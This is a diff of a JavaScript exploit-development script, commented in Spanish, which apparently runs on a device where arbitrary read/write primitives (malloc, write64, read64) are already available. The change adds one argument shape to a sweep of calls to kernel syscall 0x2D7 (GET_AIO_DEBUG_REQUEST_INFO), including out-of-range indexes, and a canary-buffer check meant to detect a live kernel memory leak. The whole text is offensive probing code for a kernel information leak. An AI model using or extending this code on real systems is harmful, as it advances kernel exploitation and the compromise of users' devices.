@@ -61,18 +61,19 @@ if(anyAIO){
  SUM.push("SHAPES init="+VS(qi1)+"/"+VS(qi2)+"/"+VS(qi3)+" create="+VS(qc1)+"/"+VS(qc2)+"/"+VS(qc3));
 }else{E(2,"shapes INIT/CREATE");R(2,"SKIPPED (familia muerta)");SUM.push("SHAPES: skipped")}
 // ===== PASO 3: 0x2D7 GET_AIO_DEBUG_REQUEST_INFO (el leak del paste) =====
-E(3,"DEBUG 0x2D7 shapes (paste: req_id en [1,0x228], req_id>>16<0x80; hipotesis (req_id, out*) y (req_id, idx, out*))");
+E(3,"DEBUG 0x2D7 shapes (paste: count bounded [1,0x228] y req_id>>16<0x80; hipotesis (req_id,out*), (req_id,idx,out*) y shape del paste (req_id,out*,count=1))");
 const LB=malloc(0x40);for(let i=0n;i<0x40n;i+=8n)write64(LB+i,0xDEADBEEF00000000n+i);
 const d1=SC("DEBUG_0x2D7",A_DEBUG,[0n,0n],"(0,0)");
 const d2=SC("DEBUG_0x2D7",A_DEBUG,[1n,LB],"(1,buf)");
+const d2b=SC("DEBUG_0x2D7",A_DEBUG,[1n,LB,1n],"(1,buf,1) shape del paste (count=1)");
 const d3=SC("DEBUG_0x2D7",A_DEBUG,[1n,0n,LB],"(1,0,buf)");
 const d4=SC("DEBUG_0x2D7",A_DEBUG,[0x10001n,LB],"(0x10001=1<<16|1,buf)");
 const d5=SC("DEBUG_0x2D7",A_DEBUG,[0x800001n,LB],"(0x800001=idx>=0x80,buf) fuera-limite");
 let leak="no";for(let i=0n;i<0x40n;i+=8n){try{if(read64(LB+i)!==0xDEADBEEF00000000n+i)leak="SI"}catch(e){leak="fault"}}
 W("oracle buf 0x2D7 post-barrido: "+(leak==="SI"?"CAMBIADO -> kernel escribio, leak VIVO: ":"ignido ")+HX(LB,48));
 const rd3=VS(d3);
-R(3,"0x2D7: "+VS(d1)+"/"+VS(d2)+"/"+rd3+"/"+VS(d4)+"/"+VS(d5)+" | escritura detectada: "+leak);
-SUM.push("DEBUG0x2D7: "+VS(d1)+"/"+VS(d2)+"/"+rd3+"/"+VS(d4)+"/"+VS(d5)+" leak="+leak);
+R(3,"0x2D7: "+VS(d1)+"/"+VS(d2)+"/"+VS(d2b)+"/"+rd3+"/"+VS(d4)+"/"+VS(d5)+" | escritura detectada: "+leak);
+SUM.push("DEBUG0x2D7: "+VS(d1)+"/"+VS(d2)+"/"+VS(d2b)+"/"+rd3+"/"+VS(d4)+"/"+VS(d5)+" leak="+leak);
 // ===== PASO 4: MULTI_POLL grid num/mode (no bloqueante) =====
 if(VIVA(v1["POLL"])){
  E(4,"POLL 0x298 grid (num,mode,0) sin contexto valido - forma de los args");
